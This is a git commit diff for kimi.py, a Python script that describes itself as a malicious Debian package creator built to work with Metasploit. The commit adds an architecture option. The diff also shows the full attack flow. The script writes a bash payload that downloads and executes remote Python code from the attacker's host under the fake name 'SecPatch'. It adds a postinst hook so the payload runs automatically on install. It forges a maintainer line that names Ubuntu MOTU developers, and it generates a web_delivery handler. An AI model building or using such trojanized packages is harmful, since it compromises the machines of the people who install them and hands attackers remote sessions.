c95861b5aa5f280f70cff051b4b12254a242cb27
Chaitanya Haritash <isiamgreat.haritash@gmail.com>
2017-10-12 17:47:52 +0530

    added command line argument to select architecture
    Now you can select architecture with command line argument (-a/--arch) :) 
    Its just a hot update cos of issue #1

--- kimi.py
+++ kimi.py
@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 
-# ____  __. .__             .__  
-#|    |/ _| |__|   _____    |__| 
-#|      <   |  |  /      \  |  | 
-#|    |  \  |  | |  Y Y   \ |  | 
-#|____|__ \ |__| |__|_|   / |__| 
-#        \/            \./Suspicious Shell Activity     
+# ____  __. .__             .__
+#|    |/ _| |__|   _____    |__|
+#|      <   |  |  /      \  |  |
+#|    |  \  |  | |  Y Y   \ |  |
+#|____|__ \ |__| |__|_|   / |__|
+#        \/            \./Suspicious Shell Activity
 #        Malicious Debain Package Creator
 #        Coded by Chaitanya Haritash
 #        Twitter :: @bofheaded
@@ -15,14 +15,14 @@
 
 #Kimi is a script which generates Malicious debian package for metasploit
 #which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
-#Bash file injects and acts like some system command which when executed by victim 
+#Bash file injects and acts like some system command which when executed by victim
 #and attacker hits with session.
 
-#Kimi basically depends upon web_delivery module and every thing is automated. 
+#Kimi basically depends upon web_delivery module and every thing is automated.
 #all the attacker needs is to do following settings :
 
 #NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
-#	It can be used standalone also all user needs is to change uripath in msf variables
+#       It can be used standalone also all user needs is to change uripath in msf variables
 
 #msf exploit(web_delivery) > set srvhost 192.168.0.102
 #srvhost => 192.168.0.102
@@ -35,7 +35,7 @@
 #msf exploit(web_delivery) > show options
 #msf exploit(web_delivery) > exploit
 
-#Thanks r00t 3xpl0it for all corrections and ideas :) <3 
+#Thanks r00t 3xpl0it for all corrections and ideas :) <3
 
 ##
 
@@ -45,15 +45,15 @@ import argparse,sys
 def printer():
      global banner
      banner = """
- ____  __. .__             .__  
-|    |/ _| |__|   _____    |__| 
-|      <   |  |  /      \  |  | 
-|    |  \  |  | |  Y Y   \ |  | 
+ ____  __. .__             .__
+|    |/ _| |__|   _____    |__|
+|      <   |  |  /      \  |  |
+|    |  \  |  | |  Y Y   \ |  |
 |____|__ \ |__| |__|_|   / |__| Ver.1.1
-        \/            \./Suspicious Shell Activity     
+        \/            \./Suspicious Shell Activity
         Malicious Debain Package Creator
         Coded by Chaitanya Haritash
-        Twitter :: @bofheaded         
+        Twitter :: @bofheaded
   """
 def main():
   try:
@@ -62,27 +62,30 @@ def main():
     parser.add_argument('-n','--name', help="Name for your package" , required="true")
     parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
     parser.add_argument('-V','--vers', help="Version for package" , required="true")
+    parser.add_argument('-a','--arch', help="Architecture (i386/amd64)" , required="true")
     global go
     go = parser.parse_args()
     global h
     global j
     global we
+    global uu
     h = str(go.name)
     j = str(go.name)+"_"+str(go.vers)
-    we = str(go.lhost) 
-    with open(h, "w+") as r:  
+    we = str(go.lhost)
+    uu = str(go.arch)
+    with open(h, "w+") as r:
       payload = """
 #!/bin/bash
-python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"  
+python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"
 
-          """ 
+          """
       k = r.write(payload)
       o = open("postinst" , "a")
       m = """
 
 #!/bin/bash
 
-chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" & 
+chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" &
 
       """
       o.write(m)
@@ -94,12 +97,12 @@ chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" &
   except IOError:
     print banner
     print "[-] please provide valid arguments [-]"
-    print ""  
-  
+    print ""
+
   #else:
   # print banner
 
-def make_deb(): 
+def make_deb():
   gen = """
 #!/bin/sh
 chmod u+x """+h+"""
@@ -109,7 +112,7 @@ Package: """+str(go.name)+"""
 Version: """+str(go.vers)+"""
 Section: Games and Amusement
 Priority: optional
-Architecture: i386
+Architecture: """+uu+"""
 Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
 Description: MDPC kimi (SSA-RedTeam development 2017)
 
@@ -140,7 +143,7 @@ rm -rf fro.sh
   os.system("sudo chmod 777 *.deb")
 
 def make_resource():
- 
+
     res = """
 use exploit/multi/script/web_delivery
 set SRVHOST """+we+"""
@@ -154,7 +157,7 @@ exploit
     print "execute handler: sudo msfconsole -r handler.rc"
     time.sleep(2)
     os.system("chmod 777 handler.rc")
-    os.system('xterm -e "sudo msfconsole -r handler.rc"')  
+    os.system('xterm -e "sudo msfconsole -r handler.rc"')
 
 if __name__ == '__main__':
   printer()
